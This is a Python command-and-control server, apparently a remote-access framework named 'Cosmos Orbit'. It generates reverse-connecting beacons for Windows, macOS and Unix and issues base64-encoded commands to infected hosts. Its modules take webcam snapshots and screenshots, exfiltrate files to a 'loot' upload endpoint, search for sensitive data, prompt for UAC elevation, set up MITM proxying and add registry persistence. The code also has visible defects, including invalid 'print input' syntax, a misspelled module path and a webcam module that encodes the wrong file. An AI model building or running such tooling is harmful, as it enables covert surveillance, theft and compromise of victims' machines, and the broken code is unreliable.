#!/usr/bin/env python3
import logging
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import time
import pyfiglet
import base64
import subprocess
import random
import csv
from flask import Flask, request

try:
    with open("Mods/screenshot/screenshot_win.txt", "r") as f:
        screenshot_mod_win_plain= f.read()
        screenshot_mod_win = base64.b64encode(screenshot_mod_win_plain.encode()).decode()

    with open("Mods/screenshot/screenshot_unix.txt", "r") as f:
        screenshot_mod_unix_plain = f.read()
        screenshot_mod_unix = base64.b64encode(screenshot_mod_unix_plain.encode()).decode()

    with open("Mods/webcam/webcam_unix.txt", "r") as f:
        webcam_mod_unix_plain = f.read()
        webcam_mod_unix = base64.b64encode(screenshot_mod_unix_plain.encode()).decode()

    with open("Mods/webcam/webcam_win.txt", "r") as f:
        webcam_mod_win_plain = f.read()
        webcam_mod_win = base64.b64encode(webcam_mod_win_plain.encode()).decode()

    with open("Mods/dependencies/dependencies_unix.txt", "r") as f:
        mod_unix_plain = f.read()
        mod_unix = base64.b64encode(mod_unix_plain.encode()).decode()

    with open("Mods/dependencies/dependencies_win.txt", "r") as f:
        mod_win_plain = f.read()
        mod_win = base64.b64encode(mod_win_plain.encode()).decode()
    

    with open("Mods/elevate/windows_elevate.txt", "r") as f:
        elevate_mod_win_plain = f.read()
        elevate_mod_win = base64.b64encode(elevate_mod_win_plain.encode()).decode()
    with open("Mpds/MTM/mitm.txt", "r") as f:
        mitm_mod_win_plain = f.read()
        mitm_mod_win = base64.b64encode(mitm_mod_win_plain.encode()).decode()

    with open("Mods/send/send_win.txt", "r") as f:
        send_mod_win_plain = f.read()

    with open("Mods/send/send_unix.txt", "r") as f:
        send_mod_unix_plain = f.read()

    with open("Mods/of_interest/of_interest_win.txt", "r") as f:
        oi_mod_win_plain = f.read()

    platformList = []

    # === Shared state for Flask display ===
    app = Flask(__name__)
    shared = {"text": "", "num": ""}

    # === ASCII Banner ===
    ascii_art = pyfiglet.figlet_format("Cosmos Orbit")
    print("\033[1;32m" + ascii_art + "\033[0m")
    print('''                                            
              -+#@@@@@@@@@@@@@@%+-                                          
           :*@@@@@@@@@@@@@@@@@@@@@@+.                                       
         -#@@@@@@%*=::::.   .:-=*%@@@+                                      
        *@@@@@*-.   :+:           :*@@#.                                    
      .%@@@%=.     *#        .:.    .+@#                                    
      %@@@+       *@.      =%@@@#-    -@=  :                                
     +@@@:       :@@      -@@@@@@@:    =*   -.                             
     %@@:        -@@:     -@@@@@@@:     +   .*                             
    .@@+      :  .@@%      =%@@@#-      =    *+                             
     %@:     -.   =@@#.      ...       ..    #@                             
     +@.     +.    =@@@=             :..    :@@.                            
      %+     *-     :#@@@*:        :+-     .%@%                             
       *:    =#:      :*%@@@%#***##+.     :%@@=                             
        -:    *#-        .-+***+=:      .*@@@*                              
         ..  .*%*=.                 .-#@@@@+                               
                +@@@#+-:.       .:-+#@@@@@#:                                
                 :*@@@@@@@%%%%%@@@@@@@@@*:                                  
                   .=*%@@@@@@@@@@@@@%*-.                                               
''')

    print("\033[1;35m" + "-"*60 + "\033[0m")
    print("\033[1;36m{:>10}\033[0m : {}".format("Author", "BullsEye Defenses"))
    print("\033[1;36m{:>10}\033[0m : {}".format("Version", "1.0.0"))
    print("\033[1;36m{:>10}\033[0m : {}".format("Description", "Welcome to the Cosmos Orbit framework"))
    print("\033[1;36m{:>10}\033[0m : {}".format("DISCLAIMER", "Refer to the DISCLAIMER.txt for usage instructions and legal terms."))

    print("\033[1;35m" + "-"*60 + "\033[0m")

    print("""
    YOU MUST AGGRE TO THE FOLLOWING:      
    1. You will not use this tool for any unauthorized or illegal activities.
    2. You will only use this tool for ethical penetration testing and with proper authorization from the owner of the system.
    3. The creator of this tool is not responsible for any damage, loss, or legal consequences resulting from the misuse of this tool.
    4. You will not use this tool to harm, compromise, or gain unauthorized access to any systems or networks.
    5. You agree to comply with all applicable laws, regulations, and guidelines governing ethical hacking and penetration testing.
    By continuing, you confirm that you understand and agree to these terms.
    Agree y or n
""")
    agree = input()
    if 'y' not in agree:
        exit()
    else:
        None

    # Get latest win
    print("Getting paylod...")
    with open("beacons/RAW_Powershell_Win.ps1", "r") as f:
        get_win_payload = f.read()


    #get latest macOS
    print("Getting paylod...")
    with open("beacons/mac_os.swift", "r") as f:
        get_mac_payload = f.read()
    

    #get latest bash
    print("Getting paylod...")
    with open("beacons/bash.sh", "r") as f:
        get_unix_payload = f.read()

    # === Input configuration ===
    while True:
        print("IP address to listen on:")
        posthost = input()
        if 'localhost' in posthost:
            print("Error: prefix not allowed, use 127.0.0.1 for localhost instead") 
        else:
            break
    print("Port to listen on:")
    postport = int(input())
except Exception as e:
    print("Error fetching... Are you in the main folder?")
print("Enter a filename to save this session's connected clients:")
csv_file = input("")
csv_file = csv_file + ".csv"

#create csv
data = ['id', 'user', 'ip']
    
with open(csv_file, 'w', newline='') as file:
    writer = csv.writer(file)
    writer.writerow(data)

print("Select Beacon Type")
print("powershell shellcode  → Type 'win'")
print("macOS binary          → Type 'mac'")
print("Raw bash (unix)       → Type 'unix'")
print ("NOTE: to compile macOS binaries, you MUST be on a macOS based system")

beacon_type = input()

if 'win' in beacon_type:
    print("Generating")
    time.sleep(1)
    generateHost = get_win_payload.replace("127.0.0.1", posthost)
    generatePort = generateHost.replace("4444", str(postport))
    win_encode = base64.b64encode(generatePort.encode('utf-16le')).decode()
    print("\033[94m" + win_encode + "\033[0m")

if 'mac' in beacon_type:
    time.sleep(1)
    try:
        generateHost_mac = get_mac_payload.replace("127.0.0.1", posthost)
        generatePort_mac = generateHost_mac.replace("4444", str(postport))
        print("Generating")
        compile_mac = subprocess.run(["swiftc", "macpayload.swift", "-o", "payload"])
        time.sleep(1)
        print("Payload saved in current directory.")
    except:
        print("Error. Could not generate payload. Is VS code installed?")

if 'unix' in beacon_type:
    print("Generating")
    time.sleep(1)
    generateHost_bash = get_unix_payload.replace("127.0.0.1", posthost)
    generatePort_bash = generateHost_bash.replace("4444", str(postport))
    print("\033[94m" + generatePort_bash + "\033[0m")

# === Flask Route ===
@app.route("/")
def home():
    return shared["text"].strip() + shared["num"].strip()


@app.route('/upload', methods=['POST'])
def submit():
    f = request.files['file']
    part = "." + f.filename.split(".", 1)[1]
    rand_name = f"{random.randint(1000, 9999)}{part}"
    f.save(f"./loot/{rand_name}")
    print("Saved to uploads folder")

    return '', 200

# === Run Flask Server ===
def run_flask():
    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    app.run(host="0.0.0.0", port=80)

try:
    threading.Thread(target=run_flask, daemon=True).start()
except:
    print("Error could not start flask server")


 #do checks on data for handling

@app.route('/', methods=['POST'])
def handle_post():
    
    try:
        decoded_data = request.get_data(as_text=True)
        if 'New windows client on ID:' in decoded_data:
                
            stripedId = (''.join(i for i in decoded_data if i.isdigit()))
            
            entry = {
                "platform_type": "Windows",
                "id": stripedId
            }

            platformList.append(entry)

            print("\033[92m" + decoded_data + "\033[0m")


        elif 'New mac client on ID:' in decoded_data:
            stripedId = (''.join(i for i in decoded_data if i.isdigit()))                

            entry = {
                "platform_type": "Mac",
                "id": stripedId
            }

            platformList.append(entry)
            print("\033[92m" + decoded_data + "\033[0m")

        elif 'New unix client on ID:' in decoded_data:            
            stripedId = (''.join(i for i in decoded_data if i.isdigit()))


            entry = {
                "platform_type": "Unix",
                "id": stripedId
            }
            platformList.append(entry)
            print("\033[92m" + decoded_data + "\033[0m")
        elif 'Client:' in decoded_data:
            print("+---------------------+")
            print("\033[92m" + decoded_data + "\033[0m")
            print("+---------------------+")

            data_setup = decoded_data.splitlines()

            #append to csv.
            try:
                with open(csv_file, 'a', newline='') as file:
                    writer = csv.writer(file)
                    for client_data in data_setup:
                        strip = client_data.replace("Client:", "").strip()
                        id, user, ip = strip.split()
                        print(strip)
 
                        with open(csv_file, newline='') as f:
                            reader_check = csv.reader(f)
                            check = False
                            for row_check in reader_check:

                                if [id, user, ip] == row_check:
                                    check = True
                                    break

                        if not check:
                            writer.writerow([id, user, ip])
                            break
            except:
                print("Error, Can not read file. Is it open?")


        #do default output if no new client key words where not found
        else:
            print("\033[92m" + decoded_data + "\033[0m")
        return 'OK', 200
    except:
        print("Error fetching data") 
        return 'Error', 500

def run_post_server():
    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    app.run(host=posthost, port=postport)
    

# === Main Command Loop ===
def main(platform_type=None):
    global platformList
    logging.basicConfig(level=logging.INFO)
    try:
        server_thread = threading.Thread(target=run_post_server, daemon=True)
        server_thread.start()
    except:
        print("Error could not start server")

    client_id = input("Waiting for clients ID. Enter client ID when a new connection appears")


    token = ""

    while True:
        print("Type list for all hot keys and modules")
        time.sleep(1)
        print(f"\033[91m{client_id}\033[35m issue a command~~\033[0m", end=" ")
        var = input()
        print("\033[94mcommand sent\033[0m")
        platform = next((item['platform_type'] for item in platformList if item.get('id') == client_id) , None)
        if 'webcam' in var:
            if platform and 'Windows' in platform:
                ps_code = webcam_mod_win.replace("127.0.0.1", posthost)
                ps_code = ps_code.replace("4444", str(postport))
                shared["text"] = ps_code
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Taking webcam pic...")
            else:
                bash_code = webcam_mod_unix.replace("127.0.0.1", posthost)
                bash_code = bash_code.replace("4444", str(postport))
                shared["text"] = bash_code
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Taking webcam pic...")

        elif 'installdep' in var:
            if platform and 'Windows' in platform:
                shared["text"] = mod_win
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Installing dependencies...")
            else:
                shared["text"] = mod_unix
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Installing dependencies...")

        elif 'screenshot' in var:
            if platform and 'Windows' in platform:
                ps_code = screenshot_mod_win.replace("127.0.0.1", posthost)
                ps_code = ps_code.replace("4444", str(postport))
                shared["text"] = ps_code
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Taking screenshot...")
            else:
                bash_code = screenshot_mod_unix.replace("127.0.0.1", posthost)
                bash_code = bash_code.replace("4444", str(postport))
                shared["text"] = bash_code
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Taking screenshot...")

        elif 'send' in var:

            if platform and 'Windows' in platform:
                filename = input("Input file name to send: ")
                sendHost = send_mod_win_plain.replace("127.0.0.1", posthost)
                sendPort = sendHost.replace("4444", str(postport))
                ps_code_send = sendPort.replace("foofile", filename)
                print(ps_code_send)
                ps_code = ps_code_send + " 906778"
                send_mod_win_encoded = base64.b64encode(ps_code.encode()).decode()
                shared["text"] = send_mod_win_encoded
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Sending file...")
            else:
                filename = input("Input file name to send: ")
                sendHost = send_mod_unix_plain.replace("127.0.0.1", posthost)
                sendPort = sendHost.replace("4444", str(postport))
                ps_code_send = sendPort.replace("foofile", filename)
                print(ps_code_send)
                ps_code = ps_code_send + " 906778"
                send_mod_unix_encoded = base64.b64encode(ps_code.encode()).decode()
                shared["text"] = send_mod_unix_encoded
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Sending file...")
        elif 'elevate' in var:
            if platform and 'Windows' in platform:
                shared["text"] = elevate_mod_win
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
                print("Elevation prompt sent...")
            else:
                print("Error: module unavailable on this platform.")
        elif 'MITM' in var:
            mitmIp = print input("Enter Proxy IP: ")
            mitmPort = print input("Enter Proxy PORT: ")
            print("Setting up... make sure you have proxy listening")
            oiHost = mitm_mod_win.replace("fooip", mitmIp)
            oiPort = oiHost.replace("fooport", str(mitmPort))
            replace_oi_encode = base64.b64encode(oiPort.encode()).decode()
            shared["text"] = replace_oi_encode
            shared["num"] = client_id
            time.sleep(0.5)
            shared["text"] = "$FALSE"
            shared["num"] = ""

        elif 'persistence' in var:
            if platform and 'Windows' in platform:
                # Note: elevatevar_mod is referenced but not defined in original scope
                try:
                    shared["text"] = elevatevar_mod
                    shared["num"] = client_id
                    time.sleep(0.5)
                    shared["text"] = "$FALSE"
                    shared["num"] = ""
                except NameError:
                    print("Error: elevatevar_mod module not loaded.")
            else:
                print("mod not support on selected platform yet.")

        elif 'id' in var:
            client_id = input("Enter new client ID: ")
        
        elif 'find' in var:
            if platform and 'Windows' in platform:
                oiHost = oi_mod_win_plain.replace("127.0.0.1", posthost)
                oiPort = oiHost.replace("4444", str(postport))
                replace_oi_encode = base64.b64encode(oiPort.encode()).decode()
                shared["text"] = replace_oi_encode
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
            else:
                print("mod not support on selected platform yet.")

        elif 'clients' in var:
            if platform and 'Windows' in platform:
                clients = "clients"
                encoded_clients = base64.b64encode(clients.encode()).decode()
                shared["text"] = encoded_clients
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
            else:
                clients = "clients"
                encoded_clients = base64.b64encode("clients".encode()).decode()
                shared["text"] = encoded_clients
                shared["num"] = client_id
                time.sleep(0.5)
                shared["text"] = "$FALSE"
                shared["num"] = ""
        
        elif 'list' in var:
            print("Hotkeys and mods:")
            print("id              → Interact with a host")
            print("clients         → Attempts to list all connected clients")
            print("find            → Appemts to search for sensitive information on target system")
            print("send            → Exfiltrate loot from client")
            print("screenshot      → Take screenshot of host (ffmpeg)")
            print("webcam          → Get webcam snapshot (ffmpeg)")
            print("elevate         → Request UAC")
            print("installdeps     → Install ffmpeg modules")
            print("persistence     → Execute payload on system startup via registry (Windows)")                
        #custom commands
        else:
            encoded = base64.b64encode(var.encode()).decode()
            shared["text"] = encoded
            shared["num"] = client_id
            time.sleep(0.5)
            shared["text"] = "$FALSE"
            shared["num"] = ""

if __name__ == "__main__":
    main()
